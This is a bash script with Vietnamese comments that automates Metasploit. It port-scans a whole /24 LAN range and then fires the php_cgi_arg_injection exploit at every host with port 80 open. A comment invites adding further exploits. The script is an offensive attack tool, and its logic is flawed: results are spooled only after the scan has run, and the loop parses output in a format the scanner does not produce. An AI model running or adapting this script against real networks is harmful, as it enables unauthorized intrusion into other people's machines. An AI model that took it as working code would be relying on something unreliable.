#!/bin/bash

# Khởi động Metasploit Framework
msfconsole -q -x "

# Tìm kiếm các dịch vụ đang chạy trên mạng LAN
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set THREADS 10
run

# Lưu kết quả quét vào file
spool /tmp/portscan_results.txt
exit
"

# Đọc kết quả quét và khai thác các dịch vụ
while read -r line; do
    ip=$(echo $line | awk '{print $1}')
    port=$(echo $line | awk '{print $2}')
    
    # Ví dụ khai thác dịch vụ HTTP
    if [ "$port" == "80" ]; then
        msfconsole -q -x "
        use exploit/unix/webapp/php_cgi_arg_injection
        set RHOST $ip
        set RPORT $port
        run
        exit
        "
    fi

    # Thêm các khai thác khác tại đây

done < /tmp/portscan_results.txt
